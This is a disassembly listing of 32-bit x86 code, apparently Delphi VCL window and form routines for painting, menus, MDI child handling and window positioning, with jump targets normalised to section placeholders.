push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_442f30
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_442f30
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_442f30
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_442f30
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_442f30
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_454f10
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45bfc4
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_421e30
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45b9da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45b9bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_422568
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_422408
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4563f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b9c4
xor edx edx
mov eax [ ebp - 0xc ]
call sub_422568
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_454f10
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45bfc4
call sub_448484
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45bb08
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_421e30
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45bae1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45bac4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_422568
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_422408
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bacb
xor edx edx
mov eax [ ebp - 0xc ]
call sub_422568
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_448484
mov esi eax
sub_45bae8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call ReleaseDC
retn
sub_45bb98
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_45bbe4
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45bff8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_45c044
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45bc24
push ebp
mov ebp esp
add esp 0xffffffa4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_45bd59
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4461d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_421d14
push eax
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
sub eax 0x2b
je r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
push ebp
call sub_45bb98
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45bff8
test eax eax
je r-xdata
push ebp
call sub_45bb98
pop ecx
push ebp
call sub_45bb98
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_45bbe4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_458e14
jmp r-xdata
sub_45bd6c
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov ecx ebx
mov eax esi
call sub_459fd8
mov eax [ esi + 0x254 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ ebx + 0xc ]
mov edi [ ebx + 0x4 ]
sub ecx edi
push ecx
mov ecx [ ebx + 0x8 ]
mov edx [ ebx ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
sub_45bda8
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_45a674
mov eax ebx
call sub_448788
test al al
je r-xdata
mov eax ebx
call sub_41e7c8
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_448484
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_445378
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_448484
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_41e79c
call sub_455a54
mov edx esi
mov eax ebx
call sub_41e79c
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
sub_45be40
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_45bebd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_45bec8
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_445ac0
sub_45bef4
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_445ac0
xor edx edx
jmp r-xdata
mov eax esi
call sub_45a154
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_45bf2c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_441568
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_445ac0
sub_45bf70
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_441674
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_45bfc4
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_43ec78
sub_45bff8
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45fabc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_45faa8
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_45c044
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45fabc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45faa8
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_45c094
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_416044
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_45c0c4
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_448484
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_45fa8c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_45fa8c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_45c094
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_45fa8c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45fa78
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_4161a0
call sub_4036c0
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45fa78
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45fa78
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45fa78
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_45c1c8
push ebx
mov ebx eax
mov eax ebx
call sub_45c1c0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_4281f8
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_45c1f0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_445a78
mov dl 0x1
mov eax esi
call sub_45c554
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_45c5d0
mov edx eax
mov eax esi
call sub_441f04
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_445c14
mov dl 0x1
mov eax esi
call sub_45b640
sub_45c270
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_448484
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_452184
mov edi eax
mov eax ebp
call sub_448484
push eax
call DrawMenuBar
sub_45c2ec
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_41e274
xor edx edx
mov eax ebx
call sub_4539e8
sub_45c310
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_45c270
mov eax edx
mov edx ebx
call sub_41e274
sub_45c338
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45c4fe
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_45fabc
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_45559c
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45faa8
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_41e274
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45faa8
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfdc
call sub_403e8c
mov eax ebx
call sub_448788
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_448484
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_45c270
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c505
lea eax [ ebp - 0x10 ]
call sub_40442c
retn
mov dl 0x1
mov eax ebx
call sub_45d3f8
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_448788
test al al
je r-xdata
mov eax ebx
call sub_448788
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_448484
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_448484
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_448484
mov edx eax
mov eax esi
call sub_45559c
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_448484
push eax
call SetMenu
sub_45c520
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45c50c
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_45c57c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_45c570
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_45c5e8
push ebx
mov ebx eax
mov eax ebx
call sub_447ae8
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0x8000000f
jne r-xdata
mov eax ebx
call sub_45c5d0
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45c5d0
mov edx eax
mov eax ebx
call sub_441f04
mov edx 0x8000000f
mov eax ebx
call sub_441f04
pop ebx
retn
sub_45c66c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_448484
push eax
call ShowWindow
sub_45c6ac
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_45c0c4
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_45c0c4
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_45fa8c
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45fa78
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_45c0c4
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45fa78
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_45fa8c
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_45fa78
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_45fa78
call sub_45f7ac
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45fa78
call sub_45f790
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45fa78
call sub_45f778
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_45fa78
call sub_45f778
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45fa78
call sub_45f778
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45fa78
call sub_45f7c4
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_45fa78
call sub_45f7ac
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45fa78
call sub_45f790
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_45fa78
call sub_45f778
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45fa78
call sub_45f7c4
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_45fa78
call sub_45f7ac
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_45fa78
call sub_45f7ac
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_45fa78
call sub_45f7ac
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45fa78
call sub_45f790
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45fa78
call sub_45f778
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45fa78
call sub_45f7c4
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_45fa78
call sub_45f778
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45fa78
call sub_45f7c4
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_45fa78
call sub_45f7ac
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45fa78
call sub_45f790
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_45ca00
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_459f9c
mov edx esi
mov eax edi
call sub_45f328
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_45caaf ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_445378
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_445378
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
